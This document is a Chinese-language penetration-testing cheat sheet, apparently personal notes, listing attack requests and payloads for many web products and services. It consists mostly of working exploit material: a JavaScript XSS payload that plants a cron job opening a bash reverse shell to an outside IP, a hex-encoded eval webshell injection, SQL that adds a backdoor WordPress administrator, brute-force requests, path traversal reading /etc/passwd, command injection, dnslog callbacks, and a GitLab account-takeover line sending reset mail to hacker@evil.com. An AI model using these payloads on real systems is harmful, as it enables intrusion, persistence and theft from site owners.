SECKEY_ABVK=z1hNWlXhJNRMfOWBcwIZZqelCyMfKElivU/svwCZzjo%3D; BMAP_SECKEY=2__IGYvkyC_isfYhAQNJUfG9ZmlOSJqO86jO158B6xt7DpDdl8vU_XEcAj1by2qFkzxQFvskvrzECqqBlu9Bp-PaZ6EPwYr595XK1qAjEYPDz8cu5m5ae-DSxRqaD1mP0lkcfUAFG7-lY-IRd3zSq0Oir1xRhOafcZ76YwQT0CqsHHw1iW-kvMhXjHvOhZId; JSESSIONID=2D86CE0B3842FC0E36528E7EFD223D1E Connection: close Content-Type: application/json Content-Length: 350 { \"id\":\"1\", \"code\":\"select * from information_schema.tables\", \"dbType\":\"jndi\", \"dbDriver\":\"com.mysql.cj.jdbc.Driver\", \"dbUrl\":\"jdbc:mysql://localhost:3307/test?allowLoadLocalInfile=yes\", \"dbName\":\"information_schema\", \"dbUsername\":\"fileread_/etc/passwd\", \"dbPassword\":\"password\", \"connectionTimaes\":\"5\" } 信呼OA 后台文件上传 还原文件 GET /task.php?m=qcloudCos|runt&a=run&fileid=19 后台配置文件getshell /index.php?a=changestyle&m=geren&d=system&ajaxbool=true&style=21,id=1,name=0x610A6576616C28245F504F53545B315D293B2F2F 重新登陆 /index.php?a=savecong&m=cog&d=system&ajaxbool=true&rnd=705961 代码执行 POST /index.php 1=phpinfo(); 注意：用了这个后台主页会出现问题 后台SSRF 保存请求 POST /index.php?a=setsave&m=xinhu&d=main&ajaxbool=true HTTP/1.1 host=http://onj888.dnslog.cn 发送请求 GET /index.php?a=testsends&m=xinhu&d=main&ajaxbool=true HTTP/1.1 前台存储型XSS漏洞 POST /?m=login&a=getoption&ajaxbool=true&num=aaaa\\ HTTP/1.1 Client-ip:111',web=0x3C7363726970743E616C65727428787373293C2F7363726970743E -- web= [XSS代码的hex编码]+[(tab键)--(tab键)] 查看日志处触发xss代码 Joomla 后台 /administrator 漏洞 CVE-2023-23752 POC Joomla! 敏感信息泄露漏洞 /api/index.php/v1/config/application?public=true /api/v1/config/application?public=true 【漏洞复现 CVE-2021-23132】Joomla远程代码执行漏洞 - StarCi - 博客园 https://www.cnblogs.com/starci/p/15174896.html Exploit Database Search https://www.exploit-db.com/search?q=joomla 【漏洞分析】CVE-2017-14596：Joomla! LDAP注入导致登录认证绕过漏洞（含演示视频）-安全客 - 安全资讯平台 https://www.anquanke.com/post/id/86899 Drupal 版本号 /install.php X-Generator: Drupal 8 (https://www.drupal.org) /core/CHANGELOG.txt Wordpress 目录遍历 /wp-content/uploads 找插件漏洞 /wp-content/plugins/wp-automatic/downloader.php?link=file:///var/www/podwoskizbryantb9_gmail.com.1305.w1261/site49107/wp-content/uploads/2020/01/index.php 扫备份文件/骑马 关键文件 wp-config.php：数据库连接 xmlrpc漏洞 爆破账密 爆破端口 WordPress WordPress xmlrpc.php 漏洞利用 - 简书 (jianshu.com) 没啥用，我只能收到dnslog 后台getshell 技术讨论 | WordPress后台拿Shell新姿态 https://mp.weixin.qq.com/s/SHO8FcH4Oz80BkgG-K8ULg 补充：插件市场直接安装有漏洞的插件 媒体-新增档案（低版本） 修改主题/插件模板文件 上传新主题压缩包/新插件压缩包（插件可以直接传php文件） # 即使显示PCLZIP_ERR_BAD_FORMAT (-10) : Unable to find End of Central Dir Record signature或者解压目录无权限 /wp-content/uploads （目录遍历） # 正常上传 /wp-content/upgrade/主题 /wp-content/plugins/插件 # webshell /wp-content/themes/twentytwentythree/patterns/config.php 插件市场安装有漏洞的插件 wpscan docker pull wpscanteam/wpscan docker run -it --rm wpscanteam/wpscan --url https://target.tld/ --enumerate u 密码重置操作 哥斯拉的数据库只能执行查询操作 冰蝎的数据库要自己进行sql操作 select * from wp_users limit 0,20 update wp_users set user_pass=md5(\"test\") where user_login=\"oY_Zb5ADu0lV2QM0KarP6y6MrLus\" 新增管理员 -- 插入新用户记录到 wp_users 表 INSERT INTO wp_users (user_login, user_pass, user_email, user_registered, user_status, display_name) VALUES ('admin', MD5('123456'), 'admin@example.com', NOW(), 0, 'admin'); -- 获取新用户的 ID SET @user_id = LAST_INSERT_ID(); -- 插入新用户角色到 wp_usermeta 表 INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES (@user_id, 'wp_capabilities', 'a:1:{s:13:\"administrator\";s:1:\"1\";}'), (@user_id, 'wp_user_level', '10'); 如何找到wordpress版本 https://target.com/feed https://target.com/?feed=rss2 ctrl+F generator 如何找到插件版本 https://target.com/wp-content/plugins/PLUGINNAME/readme.txt https://target.com/wp-content/plugins/PLUGINNAME/readme.TXT https://target.com/wp-content/plugins/PLUGINNAME/README.txt https://target.com/wp-content/plugins/PLUGINNAME/README.TXT 如何找到主题版本 https://target.com/wp-content/themes/THEMENAME/style.css https://target.com/wp-content/themes/THEMENAME/readme.txt (If they have readme file) 如果您发现过时的核心/插件/主题，请在https://wpscan.com找到漏洞利用 查找日志文件 http://target.com/wp-content/debug.log 获取网站上的用户名 http://target.com/?author=1 或者 http://target.com/wp-json/wp/v2/users http://target.com/?rest_route=/wp/v2/users 爆破后台账号密码 POST /wp-login.php HTTP/1.1 Host: target.com log=admin&pwd=BRUTEFORCE_IN_HERE&wp-submit=Log+In&redirect_to=http%3A%2F%2Ftarget.com%2Fwp-admin%2F&testcookie=1 或者 POST /xmlrpc.php HTTP/1.1 Host: target.com wp.getUsersBlogs admin BRUTEFORCE_IN_HERE 爆破端口 POST /xmlrpc.php HTTP/1.1 Host: target.com pingback.pinghttp://yourip:porthttps://target.com> 注册启用 http://example.com/wp-login.php?action=register /wp-json/oembed/1.0/proxy - SSRF 尝试访问https://xxxxxxxx.com/wp-json/oembed/1.0/proxy? url= xxxxxxxxxxxx和Worpress⽹站可能 会向您提出请求。 /wp-json 端点暴露接⼝⽂档 访问https://www.xxxx.com/wp-json端⼝会获得有关⽹站restapi的接⼝列表。 这个namespcase应该和插件名有关，正常来说是公开暴露的端点，但是⼀般会以插件名称作为命名空间，⽐如/wp-json/myplugin/v1/，再结合wpscan扫描的结果，我们可以针对插件的历史漏洞进⾏排查。 针对插件有两个要检查的： 1. 通⽤插件的历史漏洞 2. ⾃定义插件的接⼝ 因此在测试的时候先根据wpscan测⼀遍插件历史漏洞，如果没有，则去排查哪些命名空间不包含在通⽤插件内，那么这 些插件可能是⾃定义的插件，那么再去⼀个个根据接⼝格式去测试接⼝。当⾃定义插件的接⼝测试完了还是没有漏洞， 则再看看通⽤插件的接⼝是否有⼆次开发之类的。 Spring actuator端点 swagger接口 rce 权限绕过 Apache Druid kafara反序列化 Redis Redis漏洞 | Khaz's Blog (fgtbnc.github.io) VUE 主要是接口测试 go-vue-admin Gin-Vue-admin垂直越权漏洞与代码分析-CVE-2022-21660 - FreeBuf网络安全行业门户 vue-typescript-admin 芋道 /admin-api/infra/file-config/page?pageNo=1&pageSize=10 # 文件存储配置 jeeplus 代码审计入门之Jeeplus代码审计 - FreeBuf网络安全行业门户 jeeplus后台有druid，可以尝试未授权访问 https://xxx/api/jeeplus/druid/index.html https://xxx/api/jeeplus/swagger-ui.html Minio--9000端口 默认口令 minioadmin/minioadmin CVE-2023-28432 MinIO信息泄露漏洞 未经身份认证的远程攻击者通过发送特殊HTTP请求即可获取所有环境变量，其中包括MINIO_SECRET_KEY和MINIO_ROOT_PASSWORD，造成敏感信息泄露，最终可能导致攻击者以管理员身份登录MinIO。 注意点： 在MinIO在启动时会从环境变量中读取用户预设的管理员账号和密码，如果省略则默认账号密码为minioadmin/minioadmin。 另外，如果开启动Minio时没有设置MINIO_ROOT_USER和MINIO_ROOT_PASSWORD，那么Minio使用默认账号密码minioadmin，这时候再做信息泄露验证会发现读取不到管理员的账号密码，则推断存在默认口令。 /api/v1/check-version 可以查看MinIO版本 POC POST /minio/bootstrap/v1/verify HTTP/1.1 Host: User-Agent: Mozilla/5.0 Upgrade-Insecure-Requests: 1 Accept: */* Accept-Encoding: gzip, deflate Accept-Language: en-US;q=0.9 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 0 根据POC改包，可以看到存在信息泄露，包含内网IP泄露等。 拿到账密进入后台之后，可以利用MinIO的自更新达到RCE MinIO自更新RCE CVE-2021-21287--SSRF: 容器与云的碰撞——一次对MinIO的测试 | 离别歌 ssrf-CVE-2021-21287 POST /minio/webrpc HTTP/1.1 HOST:IP {\"id\":1,\"jsonrpc\":\"2.0\",\"params\":{\"token\":\"test\"},\"method\":\"web.LoginSTS\"} 反弹shell？ xxl-job XXL-JOB在真实攻防下的总结 - 先知社区 https://xz.aliyun.com/t/13899?time__1311=mqmxnQG%3DF40mD%2F8iiQGk8wdAKTqQqcDDt4D&alichlgref=https%3A%2F%2Fi.hacking8.com%2F XXL-JOB-admin（默认端口8080） 弱口令+后台命令执行 admin/123456 任务管理 - 新增 运行模式使用 GLUE(Shell) 操作处选择Glue IDE写入命令执行脚本 #/bin/bash cmd 操作处点击执行即可 未授权RCE XxlJob GET /api 老曲新唱之XXL-JOB未授权Hessian2反序列化调试分析 - 先知社区 (aliyun.com) 奇安信攻防社区-[Web实战] 记一次曲折的不出网XXL-JOB API Hessian反序列化到Getshell XxlJob >= 2.2.0 XXL-JOB-execute（默认端口9999） 指纹POST /run 注意：每发送一次下面的数据包，都需要更换jobid，因为是通过jobid作为索引来执行job的 POST /run HOST: xxx:9999 Content-Type: application/json XXL-JOB-ACCESS-TOKEN: default_token # 默认Token认证绕过 { \"jobId\": 1, \"executorHandler\": \"demoJobHandler\", \"executorParams\": \"demoJobHandler\", \"executorBlockStrategy\": \"COVER_EARLY\", \"executorTimeout\": 0, \"logId\": 1, \"logDateTime\": 1586629003729, \"glueType\": \"GLUE_SHELL\", # GLUE_SHELL对应Linux系统，GLUE_POWERSHELL对应Windows系统 \"glueSource\": \"命令\", \"glueUpdatetime\": 1586699003758, \"broadcastIndex\": 0, \"broadcastTotal\": 0 } 宝塔--8888端口 https://www.t00ls.com/viewthread.php?tid=67047&highlight=%E5%AE%9D%E5%A1%94 https://www.t00ls.com/viewthread.php?tid=68409&highlight=%E5%AE%9D%E5%A1%94 phpmyadmin pma未授权访问漏洞 影响版本 宝塔Linux面板7.4.2版本 宝塔Linux测试版7.5.13 Windows面板6.8版本 payload ip:888/pma 默认phpmyadmin路径 ip:888/phpmyadmin_随机字符串 日志XSS+CSRF导致的计划任务RCE 影响版本 6.x版本记录了验证码错误并存入数据库当中（老版本） payload 1. 在请求中插入xss 2. js内容如下 function addTask(TaskName, execTime, ip, port) { var execShell = 'bash -i >& /dev/tcp/192.168.1.14/7777 0>&1'; # 要执行的命令 execShell = encodeURIComponent(execShell); var params = 'name=' + TaskName + '&type=minute-n&where1=' + execTime + '&hour=&minute=&week=&sType=toShell&sBody=' + execShell + '&sName=&backupTo=localhost&save=&urladdress=undefined'; var xhr = new XMLHttpRequest(); xhr.open('POST', '/crontab?action=AddCrontab', false); xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); xhr.send(params); } function execTask(TaskName) { var xhr = new XMLHttpRequest(); xhr.open('POST', '/crontab?action=GetCrontab', true); xhr.send(); xhr.onload = function () { if (this.readyState == 4 && this.status == 200) { var res = JSON.parse(this.responseText); if (res[0].name == TaskName) { var TaskID = res[0].id.toString(); var xhr = new XMLHttpRequest(); xhr.open('POST', '/crontab?action=StartTask', false); xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); var params = 'id=' + TaskID; xhr.send(params); delTask(res[0].id); console.log(res[0].id); return res[0].id; } } } } function delTask(TaskID) { var params = 'id=' + TaskID.toString(); var xhr = new XMLHttpRequest(); xhr.open('POST', '/crontab?action=DelCrontab', false); xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); xhr.send(params); } var TaskName = Math.random().toString(36).substring(7); addTask(TaskName, '5', '1.1.1.1', '53'); execTask(TaskName); 数据库相关 默认保存位置 # Windows C:/BtSoft/panel/data # Linux /server/panel/data | 文件 | 作用 | | :-----------: | :--------------------: | | default.db | 数据库，保存登录信息 | | port.pl | 文本，保存开放端口 | | admin_path.pl | 文本，保存后台目录 | | default.pl | 文本，保存默认登陆密码 | default.db 账号密码存在users表中 对于password的加密方式为 md5(md5(md5(password)+'_bt.cn')+salt) 其中password为明文密码，salt在users中的salt字段 密码加密脚本如下 import hashlib # MD5 hashing with additional strings as per the provided pattern original_text = \"5fa0a808\" additional_string1 = \"_bt.cn\" additional_string2 = \"GqYa0loI4RPm\" # First MD5 hash first_md5 = hashlib.md5(original_text.encode()).hexdigest() # Second MD5 hash with additional string 1 second_md5 = hashlib.md5((first_md5 + additional_string1).encode()).hexdigest() # Final MD5 hash with additional string 2 final_md5 = hashlib.md5((second_md5 + additional_string2).encode()).hexdigest() print(final_md5) 日志保存在logs表里 adminer 一次adminer之旅 - 先知社区 (aliyun.com) Adminer( 编辑器 Fckeditor https://github.com/BaizeSec/bylibrary/blob/main/docs/%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/FCKeditor/FCKeditor%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E9%80%9A%E6%9D%80.md kindeditor 文件上传xss 上传路径 /kindeditor/asp/upload_json.asp?dir=file /kindeditor/asp.net/upload_json.ashx?dir=file /kindeditor/jsp/upload_json.jsp?dir=file /kindeditor/php/upload_json.php?dir=file POST /admin/kindeditor/asp/upload_json.asp?dir=file HTTP/1.1 Host: xxx Content-Length: 210 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryZ4ILit8qr5XXhdT5 Connection: close ------WebKitFormBoundaryZ4ILit8qr5XXhdT5 Content-Disposition: form-data; name=\"imgFile\"; filename=\"1.html\" Content-Type: text/html ------WebKitFormBoundaryZ4ILit8qr5XXhdT5-- 列目录 /kindeditor/php/file_manager_json.php?path=/ F12修改后缀重命名文件getshell Ueditor SSRF /ueditor/jsp/getRemoteImage.jsp?upfile=url /ueditor/jsp/controller.jsp?action=catchimage&source[]=url /ueditor/php/controller.php?action=catchimage&source[]=url 文件上传 XSS Ueditor 默认支持上传 xml ：config.json可以查看支持上传的后缀 /ueditor/asp/config.json /ueditor/net/config.json /ueditor/php/config.json /ueditor/jsp/config.json 上传PATH /ueditor/xxx/controller.php?action=uploadfile /ueditor/xxx/controller.php?action=uploadimage 数据包 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9zWBDx6vAJHGTpAl Content-Length: 325 ------WebKitFormBoundary9zWBDx6vAJHGTpAl Content-Disposition: form-data; name=\"upfile\"; filename=\"1.xml\" Content-Type: image/png alert(1); ------WebKitFormBoundary9zWBDx6vAJHGTpAl 问题 .net下GetShell 服务器上存放名为666.jpg的图片马 POST /替换漏洞URL地址拼接/UEditor/net/controller.ashx?action=catchimage HTTP/1.1 Host: x.x.x.x Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 sec-ch-ua-platform: \"Windows\" sec-ch-ua: \"Google Chrome\";v=\"100\", \"Chromium\";v=\"100\", \"Not=A?Brand\";v=\"24\" sec-ch-ua-mobile: ?0 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 49 source[]=http://替换为自己服务器开启http服务的URL地址/666.jpg?.aspx 帆软 安全漏洞声明- FineReport帮助文档 - 全面的报表使用教程和学习资料 能够作为致远OA的组件 帆软V8 奇安信攻防社区-帆软报表 V8.0 组合拳漏洞分析及复现 帆软报表组合拳漏洞分析 帆软报表 V8 get_geo_json 任意文件读取漏洞 CNVD-2018-04757 - Vuls Wiki FineReport（帆软）报表系统目录遍历漏洞复现和用简易过滤器处理 - 灰信网（软件开发博客聚合） 帆软V9 帆软（FineReport) V9任意文件覆盖漏洞 - 先知社区 帆软V10 反序列化 webroot/decision/remote/design/channel # 路径 WebReport/ReportServer Blade-X 图标 奇安信攻防社区-spring-blade SQL注入漏洞 (butian.net) 转载：SpringBlade框架JWT认证缺陷漏洞CVE-2021-44910 - 掘金 (juejin.cn) ThinkPHP 代码审计之tp各版本链子调式随笔 - 先知社区 http://xz.aliyun.com/t/14038?time__1311=eqIxBDyD07G%3DYiKitD%2FWn2b8QiqqAKD8YeD#toc-28 debug模式下 敏感变量泄漏：比如数据库的账密 日志泄漏（这个感觉比较多） # 默认日志名为year_month_day.log /Application/Runtime/Logs/app_name/日志名 /Runtime/Logs/app_name/日志名 # 其他碰见过的日志名 day.log /year/month/day.log 找登录日志进后台 观察sql语句进行SQL注入 cache文件getshell 缓存文件：网站为了实现加速访问，会将用户访问过的页面存入缓存来减小数据库查询的开销 可能需要通过日志找到cache文件的命名方式 默认情况下 # 漏洞形成点 Cache::set(\"name\",$value,3600); # set(缓存标识，缓存值，缓存保留时间) $data = \"\"; # payload $data=\"%0a%0dphpinfo();//\" # 生成的缓存文件位置 /runtime/cache/MD5(name)前两位/MD5(name)后30位.php 文件读取 ?s=index/\\think\\Lang/load&file=/etc/passwd 反序列化 Thinkphp5 RCE总结 - Y4er的博客 https://y4er.com/posts/thinkphp5-rce/#5010 关键是找好路由，默认是以./public/index.php作为入口文件，但是很多都是二开，入口文件不一样 ThinkPHP 前提条件： PHP环境开启了register_argc_argv PHP环境安装了pcel/pear payload ?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/+/var/www/html/a.php 记得在burp中发送，否则浏览器会将 相关文章 一次实战中对tp5网站getshell方式的测试 - 先知社区 https://xz.aliyun.com/t/10397?u_atoken=bd39fa3f-27e6-48c8-8b24-0914f7d52cea&u_asession=0107aUPLH02VyMq5l2bQ1rJqxO9w09bZdhtwpo-LcXEMlexgaezyHFq8YP73UBF0dHxb7w_ePXHSZCYxDkbgVwRtsq8AL43dpOnCClYrgFm6o&u_asig=05TLfL3h27z5sjRpO60Xhk4KJy4jzYas6TL5hoa3TC-XZZ7_Qqh-xR721_HDl1HXsWX6duFq3DEUnpjEdBOtUxCt_3Ro2HyeedXcyLFtm4EAFaXTgQSh0_yThH-4s10MXVrLloBgFgEDzkpHBSzONvZW_dqCVdL-mrGHvozk4u6EzaKUxtB9OnxETkEKIRw6I4ksmHjM0JOodanL5-M1Qs1RNYVI7Zx8cse5jmZICjbJo1odU9NAP3CLNgLKXD3WsYJ9teUCXjKpGfDlN67LYSUPcOlfkLn0Wijfp9ix1RLDLUpLHxH1iRKZmnjAu0Zefw&u_aref=PM9yMaut3%2FM9WTgVfiEQMWW6YX0%3D 奇安信攻防社区-Thinkphp5-rce-过宝塔小思路 https://forum.butian.net/index.php/share/1121 Thinkphp二开框架 hisiphp 从 hisiphp 中 getshell - 火线 Zone-安全攻防社区 https://zone.huoxian.cn/d/2726-hisiphp-getshell Hisiphp代码审计后台getshell_hisiphp 漏洞-CSDN博客 https://blog.csdn.net/qq_18193739/article/details/132765176 csrf and xss Vulnerability · Issue #3 · hisiphp/hisiphp https://github.com/hisiphp/hisiphp/issues/3 ThinkAdmin https://www.t00ls.com/viewthread.php?tid=68505&highlight=thinkadmin FastAdmins admin.php/index/login 框架特征 框架了解 FastAdmin在线演示,FastAdmin插件演示 – 基于ThinkPHP和Bootstrap的极速后台开发框架 https://www.fastadmin.net/demo.html 渗透姿势 ThinkPHP 5日志文件包含trick - 水泡泡 - 博客园 https://www.cnblogs.com/r00tuser/p/14344922.html Fastadmin 漏洞合集 | Caps 任意文件读取 /index/ajax/lang?lang=../../application/database Laravel index.php 报错信息 debug模式下信息泄漏 使用不允许的请求方法 或者目录扫描？？？ .env vendor/.env lib/.env lab/.env cronlab/.env cron/.env core/.env core/app/.env core/Database/.env database/.env config/.env assets/.env app/.env apps/.env uploads/.env sitemaps/.env site/.env admin/.env web/.env public/.env en/.env tools/.env v1/.env administrator/.env laravel/.env 任意用户登录 content-type:application/json {\"username\":[0,0],\"password\":\"1\"} NDay Laravel Debug mode RCE（CVE-2021-3129）分析复现 - 先知社区 (aliyun.com) CVE-2018-15133 Laravel framework 5.5.x 需要知道app_key（debug模式下的base64字符串） aljavier/exploit_laravel_cve-2018-15133: Exploit for Laravel Remote Code Execution with API_KEY (CVE-2018-15133) (github.com) python pwn_laravel.py url App_key -c command 或者-i进入交互模式 遇到的问题 爆破后台时，状态码全为419 Laravel为了防止跨域攻击会有一个CSRF-TOKEN，如果Token过期了，发起的请求就会都是419状态码，需要重新获取CSRF-TOKEN xss刷洞 /_ignition/scripts/--> GitLab nmap版本判断 https://github.com/righel/gitlab-version-nse/ 目录穿越读取文件--CVE-2023-2825--实际利用感觉挺难的 前提条件： gitlab-ee/ce == 16.0.0 存在可以达到根⽬录的嵌套可公开访问到的group项⽬⽽且存在附件(issus 评论等) 或普通⽤户权限⼿动创建多层group和项⽬ payload # 123为issue标题，uploads/dde0c86647fa452e76b94c9588d7fcbb为附件所在目录 http://your-ip/group1/group2/group3/group4/group5/group6/group7/group8/group9/123/uploads/dde0c86647fa452e76b94c9588d7fcbb/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd SSRF CVE-2021-22214 GITLAB SSRF 未授权漏洞-安全客 - 安全资讯平台 RCE gitlab未授权RCE（CVE-2021-22205）漏洞复现及深入利用-安全客 - 安全资讯平台 信息泄漏（鸡肋） POST /api/graphql # 用户名 {\"query\":\"{users{edges{node{username,email}}}}\"} # 用户名，邮箱，头像信息 {\"query\":\"{\\nusers {\\nedges {\\n node {\\n username\\n email\\n avatarUrl\\n status {\\n emoji\\n message\\n messageHtml\\n }\\n }\\n }\\n }\\n }\",\"variables\":null,\"operationName\":null} 任意用户接管漏洞--CVE-2023-7028 GitLab在重置密码时，可以传入数组作为email，攻击者将自己的邮箱加入数组中，可以让GitLab在重置密码时将邮件发给数组里的所有用户。 user[email][]=my.target@example.com&user[email][]=hacker@evil.com Gitblit 代码仓库可以直接git clone。。。 Gitblit 1.9.3 目录遍历 /resources//../WEB-INF/web.xml 若依 若依漏洞 | Khaz (fgtbnc.github.io) 遇到的问题 用户凭证（工具是cookie，但是遇到的很多都是JWT的） 定时任务处的过滤 Phpstudy 指纹 response的Server：Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02 集成环境 nginx解析漏洞 phpmyadmin目录 【漏洞复现】phpStudy 小皮 Windows面板 RCE漏洞phpstudy 漏洞李火火安全阁的博客-CSDN博客 shiro shiro漏洞 | Khaz (fgtbnc.github.io) 海康威视 【漏洞总结】海康威视八大漏洞汇总 https://mp.weixin.qq.com/s/khra2Z6U57kktxGooUEu-A 海康威视IP Camera Isecure Center综合安防管理平台任意文件上传 iVMS-5000,iVMS-8700任意文件上传 Jenkins https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/ Struct2 OGNL表达式注入 # 关键函数 Ognl.getValue() 测试OGNL表达式${233*233}，如果页面回显233*233的结果，则存在OGNL表达式解析。 漏洞名称 注入点 影响版本 S2-061 2.0.0 - 2.5.25 S2-045 Content-Type 2.3.5 - 2.3.31， 2.5 - 2.5.10 S2-046 文件上传的filename值位置，并需要使用\\x00截断 2.3.5 - 2.3.31， 2.5 - 2.5.10 S2-005 S2-008 S2-009 S2-013 S2-016(实际上,很多都老系统都漏补了这个洞,成功率较高) S2-019 S2-020 S2-devmode S2-032 S2-033 S2-037 S2-045 S2-046 S2-048 S2-052 S2-053 S2-057 JBOSS JBoss是一个基于J2EE的开发源代码的应用服务器。JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB1.1、EJB2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或 Jetty绑定使用。 奇安信攻防社区-Jboss渗透合集 typecho 后台路径https://www.03sec.com/Reprinted/typechoxiu-gai-hou-tai-lu-jing-liu-xia-de-lou-dong.html 后台修改文章php文件直接getshell Typecho反序列化漏洞分析 https://xz.aliyun.com/t/9428 端口渗透 协议类 FTP-20/21 介绍 应用层协议，用于文件传输 端口21 用于FTP的控制连接，用于建立和维护FTP会话。客户端通过该端口与服务器进行通信，发送命令和接收响应。 端口20 用于FTP的数据连接，用于在客户端和服务器之间传输数据。例如，当需要上传或下载文件时，数据将通过端口20进行传输。 存在的风险 anonymous匿名访问，弱口令，从而可以任意访问文件 SSH-22 介绍 用于连接远程服务器，使用公钥算法进行通信 存在的风险 上传公钥getshell 弱口令getshell ssh后门权限维持 Telent-23 介绍 跟ssh作用相同，但是是明文通信很不安全，已被ssh代替 存在的风险 网络嗅探，获取敏感信息 判断TCP协议是否出网 SMTP/SMTPS-25/465 介绍 应用层协议，用于邮件的发送 存在的风险 未授权访问/弱口令，从而可以发送钓鱼邮件 DNS-53 介绍 应用层协议，用于将域名解析为IP地址或者进行反向解析。 存在的风险 DNS欺骗 DNS缓存投毒 拒绝服务攻击 域传送 POP3-110 介绍 应用层协议，用于从邮件服务器上下载电子邮件到本地客户端。 存在的风险 明文传输 邮件劫持 IMAP-143 介绍 应用层协议，允许用户在邮件服务器上管理和检索电子邮件。 存在的风险 同POP3 Rsync-893 介绍 Rsync是Linux下的一款数据备份工具，支持通过rsync协议、ssh协议进行远程文件传输（但不支持两台远程计算机之间的同步）。常被用于在内网进行源代码的分发及同步更新，因此使用人群多为开发人员。 存在的风险 其中rsync协议默认监听873端口，而一般开发人员安全意识薄弱的情况下，如果目标开启了rsync服务，并且没有配置ACL或访问密码，我们将可以读写目标服务器文件。 查看 rsync 守护程序分配的所有 module 列表 rsync rsync://IP:873 下载文件或目录到本地 rsync -avz ip://xxx/secret /root/secret 上传文件到服务器 rsync -avz webshell.php ip://web/ 修复 rsync默认的配置文件/etc/rsyncd.conf motd file -> motd文件位置 log file -> 日志文件位置 path -> 默认路径位置 use chroot -> 是否限定在该目录下，默认为true，当有软连接时，需要改为fasle,如果为true就限定为模块默认目录 read only -> 只读配置（yes or no） list=true -> 是否可以列出模块名 uid = root -> 传输使用的用户名 gid = root -> 传输使用的用户组 auth users -> 认证用户名 secrets file=/etc/rsyncd.passwd -> 指定密码文件，如果设定验证用户，这一项必须设置，设定密码权限为400,密码文件/etc/rsyncd.passwd的内容格式为：username:password hosts allow=192.168.0.101 -> 设置可以允许访问的主机，可以是网段，多个Ip地址用空格隔开 hosts deny 禁止的主机，host的两项可以使用*表任意。 SMB-445/139 SMB（Server Message Block）服务是一种网络文件共享协议，主要用于局域网内的文件共享、打印机共享和其他网络资源的访问。SMB协议广泛用于Windows操作系统，但现在也支持Linux和macOS。 基本操作 smbclient -L Host -N // 匿名访问 smbclient //192.168.1.100/shared -U username // 指定用户登录 smbclient //192.168.1.100/shared -U DOMAIN/username // 域认证登录 // 非交互模式 smbclient //192.168.1.100/shared -U username -c \"command\" // 交互模式 ls // 列文件 get \"filename\" //下载文件 put localfile remotefile // 上传文件 mkdir dirname // 创建目录 del filename // 删除文件 exit // 退出 CVE-2020-0796 SMBGhost WinRM-5985/5986 WinRM（Windows远程管理） 是一种Windows操作系统中的协议和服务，基于 WS-Management（Web服务管理协议） 标准。它用于通过HTTP或HTTPS进行远程管理和系统配置。 数据库类 MSSQL-1433 关系型数据库 Oracle-1521 Mysql-3306 PostgreSQL-5432 Reidis-6379 MongoDB-27017 非关系型数据库 弱口令 未授权访问 NoSql注入 Access-无端口号 Access数据库属于文件型数据库，所以不需要端口号。 在Office 2007之前的Access数据库文件的后缀是 .mdb ，Office2007及其之后的Access数据库文件的后缀是 .accdb Web服务类 Weblogic-7001 JBOSS-8080 Jenkis-8080 Zabbix-10051 zabbix是一款服务器监控软件，默认服务开放端口为10051，其由server、agent、web等模块组成，其中web模块由PHP编写，用来显示数据库中的结果。 Zabbix 攻击面挖掘与利用 (seebug.org) 未授权访问 /zabbix.php?action=problem.view&ddreset=1 /overview.php?ddreset=1 /srv_status.php?ddreset=1 /latest.php?ddreset=1 bylibrary/docs/漏洞库/01-CMS漏洞/zabbix at main · BaizeSec/bylibrary (github.com) sql注入 后台创建脚本getshell CVE-2022-23131：Zabbix SSO认证绕过漏洞 - SecPulse.COM | 安全脉搏 CVE-2020-11800 zabbix RCE漏洞细节披露 - 先知社区 (aliyun.com) 进入后台启自动注册功能 exp获取server端（exp需要在zabbix所在的服务器上运行） python exp.py 127.0.0.1 cmd 宝塔-8888 /pma Solr-8983 /solr/admin Apache Solr Docker-Remote-API-2375 Docker 远程 API 未授权访问逃逸 | T Wiki (teamssix.com) Docker Registry-5000 RabbitMQ-15672、15692、25672 弱口令guset/guest 远程桌面 RDP-3389 设备 Vmware W01fh4cker/ScreenConnect-AuthBypass-RCE: ScreenConnect AuthBypass(cve-2024-1709) --> RCE!!! https://github.com/W01fh4cker/ScreenConnect-AuthBypass-RCE 路由器 飞星鱼路由器 POST /send_order.cgi?parameter=operation HTTP/1.1 Host: your-ip User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Accept: */* Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Type: application/x-www-form-urlencoded {\"opid\":\"1\",\"name\":\";id;\",\"type\":\"rest\"} cacti cacti是一套基于PHP,MySQL,SNMP及RRDTool开发的网络流量监测图形分析工具 CVE-2022-46169 GET /remote_agent.php?action=polldata&local_data_ids[0]=6&host_id=1&poller_id=`ping%20e2y29y.dnslog.cn` X-Forwarded-For: 127.0.0.1 